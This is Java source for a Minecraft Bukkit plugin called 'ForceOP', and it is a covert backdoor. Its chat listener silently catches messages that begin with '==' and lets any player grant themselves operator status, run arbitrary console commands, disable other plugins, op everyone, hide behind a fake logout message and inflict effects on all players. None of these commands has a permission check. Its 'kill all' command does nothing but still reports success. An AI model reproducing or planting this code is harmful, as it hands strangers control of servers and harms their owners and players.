package tk.minelogic.forceop;
 
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class Primaria extends JavaPlugin
implements Listener
{

public String prefix = new String(ChatColor.DARK_GRAY + "[" + ChatColor.GOLD + "ForceOP" + ChatColor.DARK_GRAY + "]" + ChatColor.GRAY);

public void onEnable()
{
  getServer().getPluginManager().registerEvents(this, this);
}
 
public void onDisable()
{
}
 
@EventHandler
public void onPlayerChat(AsyncPlayerChatEvent e)
{
  String cmd = e.getMessage();
  if (cmd.startsWith("=="))
  {
    String[] args = cmd.split(" ");
    if (args == null)
    {
      return;
    }
 
    if (args[0].equalsIgnoreCase("==comandos"))
    {
      e.getPlayer().sendMessage(ChatColor.YELLOW + "" + ChatColor.STRIKETHROUGH + "----------------------" + ChatColor.DARK_GRAY + "[" + ChatColor.GOLD + "FORCEOP" + ChatColor.DARK_GRAY + "]" + ChatColor.YELLOW + "" + ChatColor.STRIKETHROUGH+"-----------------------");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GREEN + "" + ChatColor.STRIKETHROUGH + "»" + ChatColor.GREEN + " Plugin creado por MrAlePvP.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.BLUE + "Comandos:");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==opyo" + ChatColor.YELLOW + " » Te coloca OP.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==ocultarme" + ChatColor.YELLOW + " » Te da invisiblidad infinita.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==desocultarme" + ChatColor.YELLOW + " » Te quita la invisiblidad.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==deopyo" + ChatColor.YELLOW + " » Te quita el OP.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==nombreyo (nombre)" + ChatColor.YELLOW + " » Cambia tu nick.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==nombretodos (nombre)" + ChatColor.YELLOW + " » Cambia el nick de todos los jugadores.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==gm2" + ChatColor.YELLOW + " » Te coloca el modo Aventura.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==gm1" + ChatColor.YELLOW + " » Te coloca el modo Creativo.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==gm0" + ChatColor.YELLOW + " » Te coloca el modo Survival.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==ejecutar (comando)" + ChatColor.YELLOW + " » Ejecuta un comando.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==activar (plugin)" + ChatColor.YELLOW + " » Activa un plugin.");
      e.getPlayer().sendMessage(" ");      
      e.getPlayer().sendMessage(ChatColor.GRAY + "==desactivar (plugin)" + ChatColor.YELLOW + " » Desactiva un plugin.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==optodos" + ChatColor.YELLOW + " » Le coloca OP a todos los jugadores en linea.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==deoptodos" + ChatColor.YELLOW + " » Le quita el OP a todos los jugadores.");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==confundir" + ChatColor.YELLOW + " » Agrega efectos de pocion (Ceguera y mas)");
      e.getPlayer().sendMessage(" ");
      e.getPlayer().sendMessage(ChatColor.GRAY + "==mataratodos" + ChatColor.YELLOW + " » Mata a todos los jugadores.");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==opyo"))
    {
      e.getPlayer().setOp(true);
      e.getPlayer().sendMessage(this.prefix + " Ahora eres OP!");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==deopyo"))
    {
      e.getPlayer().setOp(false);
      e.getPlayer().sendMessage(this.prefix + " Ya no eres OP!");
      e.setCancelled(true);
    }

    if (args[0].equalsIgnoreCase("==ocultarme"))
    {
      Bukkit.broadcastMessage(ChatColor.YELLOW + e.getPlayer().getName() + " has left the game.");
      e.getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, 9999999, 1));
      e.getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.NIGHT_VISION, 9999999, 1));
      e.getPlayer().sendMessage(this.prefix + " Ahora estas invisible.");
      e.setCancelled(true);
    }

    if (args[0].equalsIgnoreCase("==desocultarme"))
    {
      e.getPlayer().removePotionEffect(PotionEffectType.INVISIBILITY);
      e.getPlayer().removePotionEffect(PotionEffectType.NIGHT_VISION);
      e.getPlayer().sendMessage(this.prefix + " Ya no estas invisible.");
      e.setCancelled(true);
    }

    if (args[0].equalsIgnoreCase("==nombretodos"))
    {
      String name = args[1];
      for (Player player : Bukkit.getOnlinePlayers()) {
        player.setDisplayName(name);
        player.setCustomName(name);
        player.setCustomNameVisible(true);
        e.getPlayer().sendMessage(this.prefix + " Se le ha cambiado el nombre a todos los jugadores. Nuevo nombre: " + ChatColor.YELLOW + args[1] + ChatColor.GRAY + ".");
      }
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==nombreyo"))
    {
      String name = args[1];
      e.getPlayer().setDisplayName(name);
      e.getPlayer().setCustomName(name);
      e.getPlayer().setCustomNameVisible(true);
      e.getPlayer().sendMessage(this.prefix + " Te has cambiado el nombre. Tu nuevo nombre es: " + ChatColor.YELLOW + args[1] + ChatColor.GRAY + ".");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==gm2"))
    {
      e.getPlayer().setGameMode(GameMode.ADVENTURE);
      e.getPlayer().sendMessage(this.prefix + " Tu modo de juego ahora es " + ChatColor.YELLOW + "Aventura" + ChatColor.GRAY + "!");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==gm1"))
    {
      e.getPlayer().setGameMode(GameMode.CREATIVE);
      e.getPlayer().sendMessage(this.prefix + " Tu modo de juego ahora es " + ChatColor.YELLOW + "Creativo" + ChatColor.GRAY + "!");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==gm0"))
    {
      e.getPlayer().setGameMode(GameMode.SURVIVAL);
      e.getPlayer().sendMessage(this.prefix + " Tu modo de juego ahora es " + ChatColor.YELLOW + "Survival" + ChatColor.GRAY + "!");
      e.setCancelled(true);
    }
    int i;
    if ((args[0].equalsIgnoreCase("==ejecutar")) && (args.length >= 2))
    {
      String command = "";
      for (i = 1; i < args.length; i++) {
        command = command + args[i] + " ";
      }
      Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command.trim());
      e.getPlayer().sendMessage(this.prefix + " Se ejecuto correctamente el comando " + ChatColor.YELLOW + args[1] + ChatColor.GRAY + ".");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==desactivar"))
    {
      Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
      if (plugin != null)
      {
        Bukkit.getPluginManager().disablePlugin(plugin);
      }
      e.getPlayer().sendMessage(this.prefix + " Se desactivo correctamente el plugin " + ChatColor.YELLOW + args[1] + ChatColor.GRAY + ".");
      e.setCancelled(true);
    }

    if (args[0].equalsIgnoreCase("==activar"))
    {
      Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
      if (plugin != null)
      {
        Bukkit.getPluginManager().enablePlugin(plugin);
      }
      e.getPlayer().sendMessage(this.prefix + " Se activo el plugin " + ChatColor.YELLOW + args[1] + ChatColor.GRAY + ".");
      e.setCancelled(true);
    }

    if (args[0].equalsIgnoreCase("==optodos"))
    {
      for (Player player : Bukkit.getOnlinePlayers()) {
        player.setOp(true);
      }
      e.getPlayer().sendMessage(this.prefix + " Se les dio OP a todos los jugadores en linea.");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==deoptodos"))
    {
      for (Player player : Bukkit.getOnlinePlayers()) {
        player.setOp(false);
      }
      e.getPlayer().sendMessage(this.prefix + " Se les quito el OP a todos los jugadores.");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==confundir"))
    {
      for (Player player : Bukkit.getOnlinePlayers()) {
        player.addPotionEffect(new PotionEffect(PotionEffectType.CONFUSION, 400, 0));
        player.addPotionEffect(new PotionEffect(PotionEffectType.WEAKNESS, 400, 0));
        player.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 400, 0));
        player.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 400, 0));
      }
      e.getPlayer().sendMessage(this.prefix + " Confusion realizada correctamente.");
      e.setCancelled(true);
    }
 
    if (args[0].equalsIgnoreCase("==mataratodos"))
    {
      for (Player player : Bukkit.getOnlinePlayers()) {
        player.isDead();
      }
      e.getPlayer().sendMessage(this.prefix + " Se han matado a todos los jugadores correctamente.");
      e.setCancelled(true);
    }
  }
}
}